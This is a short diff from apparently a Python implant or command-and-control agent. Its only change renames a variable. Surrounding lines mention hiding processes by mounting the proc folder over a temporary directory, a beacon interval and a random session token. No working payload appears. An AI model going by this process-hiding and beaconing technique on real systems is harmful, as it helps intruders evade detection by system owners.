@@ -12,7 +12,7 @@ hides processes by mounting proc folder to a tmp directory
 
 PROC_HIDE_CMD = f''
 BEACON_INTERVAL = 0
-tmp_dir = ''
+TMP_DIR = ''
 
 token = ''.join(choice(ascii_letters + digits) for _ in range(72))
 pid = getpid()
